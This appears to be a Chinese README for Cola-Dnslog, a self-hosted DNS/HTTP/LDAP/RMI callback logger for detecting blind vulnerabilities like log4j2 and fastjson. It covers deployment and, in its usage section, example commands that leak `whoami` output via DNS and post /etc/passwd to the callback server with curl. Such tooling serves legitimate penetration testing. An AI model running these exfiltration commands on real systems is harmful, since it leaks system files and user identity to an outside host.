<div style="text-align:center;" width="100%">
<img src="readme_resource/sugerless.png" alt="sugerless" width="250px" />
<img src="readme_resource/dnslog.png" alt="dnslog" width="250px" />
</div>


英文版本在路上......

# Cola-Dnslog

<p style="text-align:right;">--AbelChe</p>

涉及到技术、框架：

`dns` `http` `ldap` `rmi` `webui` `vue-element-admin` `fastapi` `sqlite`

可帮助检测漏洞：

`log4j2` `fastjson` `ruoyi` `Spring` `RCE` `Blind SQL` `Bland XXE`

特色：

`Dingtalk Robot` `Bark` `API` `ldaplog` `rmilog` `Docker`

## 🥯 使用方法

> 假设你购买的域名为`example.com`
>
> 你的vps ip为`1.1.1.1`

### 域名

请自行购买域名，并将域名的解析服务器托管至部署cola_dnslog的服务器

以godaddy为例

1. 配置域名解析处右上角三个点，点击Host Names

![image-20220717175903352](readme_resource/image-20220717175903352.png)

2. 修改或新增主机名如下图所示，ip地址填写你的vps地址即可

![image-20220717180002176](readme_resource/image-20220717180002176.png)

3. 回到dns管理，将域名服务器修改为`ns1.example.com`和`ns2.example.com`

![image-20220717180242944](readme_resource/image-20220717180242944.png)

### 安装部署

共分四步

#### **第一步 下载源码**

下载源码

```sh
git clone https://github.com/sugarlessCola/cola_dnslog.git
```



> 我习惯于将服务用`tmux`放到后台运行

#### **第二步 启动webserver**

安装python（python>=3.7）依赖

注意，需要用python3.7及以上版本，否则会有兼容性问题，多python推荐使用conda

```sh
cd cola_dnslog
pip install -r requirements.txt
```

修改根目录下的`config.yaml`

主要需要修改`DNS_DOMAIN` `NS1_DOMAIN` `NS2_DOMAIN` `SERVER_IP`

```yaml
global:
  DB_FILENAME: sqlite.db

logserver:
  DNS_DOMAIN: example.com
  NS1_DOMAIN: ns1.example.com
  NS2_DOMAIN: ns2.example.com
  SERVER_IP: 1.1.1.1
  DNS_PORT: 53
  HTTP_HOST: 0.0.0.0
  HTTP_PORT: 80
  LDAP_HOST: 0.0.0.0
  LDAP_PORT: 1389
  RMI_HOST: 0.0.0.0
  RMI_PORT: 1099

webserver:
  HOST: 0.0.0.0
  PORT: 28001
  PASSWORD_SALT: 随便一长串字符串，如：cuau89j2iifdas8
```

启动webserber端和logserver端，注意这里一定要先启动webserver端（因为要先通过webserver端初始化数据库，初始化之后会在终端输出账号、密码、token、logid等信息。

```sh
chmod +x start_webserver
./start_webserver
```

![image-20220730035846090](readme_resource/image-20220730035846090.png)



#### **第三步 启动logserver**

```sh
chmod +x start_logserver
./start_logserver
```

![image-20220730160132103](readme_resource/image-20220730160132103.png)



#### **第四步 启动前端**

现在来到前端（不一定要和webserver放在一起，你甚至可以通过electron打包成本地客户端），先修改配置文件`.env.production`

```sh
cd src/app/front
vim .env.production
```

```ini
# just a flag
ENV = 'production'

# base api
VUE_APP_BASE_API = 'http://1.1.1.1:28001'

TARGET_API = 'http://1.1.1.1:28001'
```

然后npm安装依赖、打包、启动http服务（这里可以随意选择http服务器，为了方便我直接用python启动）

```sh
cd src/front
npm install
npm run build:prod

cd dist
python3 -m http.server 18001
```

至此，三端（webserver端、logserver端、webui前端）已经全部开启！

这时，访问http://1.1.1.1:18001应该可以看到登录页面！

玩得开心！

### 如何使用

上文提到，假定我的域名和ip是`example.com`和`1.1.1.1`，并且我们账户的logid为`qrq`

#### DNS

```sh
nsloopup `whoami`.qrq.example.com
ping `whoami`.qrq.example.com
```

#### HTTP

```
curl 1.1.1.1/qrq/some/info
curl -d @/etc/passwd 1.1.1.1/qrq/postdata

```



## 👀 概览

### 登录

![image-20220730151326711](readme_resource/image-20220730151326711.png)



### 首页

![image-20220730151454295](readme_resource/image-20220730151454295.png)



### Dnslog

![image-20220730151604227](readme_resource/image-20220730151604227.png)



### Httplog

![image-20220730151741311](readme_resource/image-20220730151741311.png)



### Ldaplog

![image-20220730151826344](readme_resource/image-20220730151826344.png)



### Rmilog

![image-20220730151921478](readme_resource/image-20220730151921478.png)



### 账号信息

![image-20220730152019445](readme_resource/image-20220730152019445.png)

## 🎯 ==TODO==

- [ ] 联动钉钉、bark
- [ ] 前端的优化
- [ ] docker一键部署
- [ ] 其他协议

## 📜 声明

本项目使用 Apache License 2.0

## 💦 其他

参考：

- https://panjiachen.github.io/vue-element-admin-site/zh/
- [https://github.com/NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
- https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/faq.html#netcontact
- http://www.hackdig.com/02/hack-596460.htm
- 太多了没法一一列出......................

师傅们可以加我wx，一起交流进步`RG9nZ3lDaGVuZwo=`

给他买杯咖啡，让他接着码！

<img src="readme_resource/wx.jpg" alt="IMG_4788" width="300px" />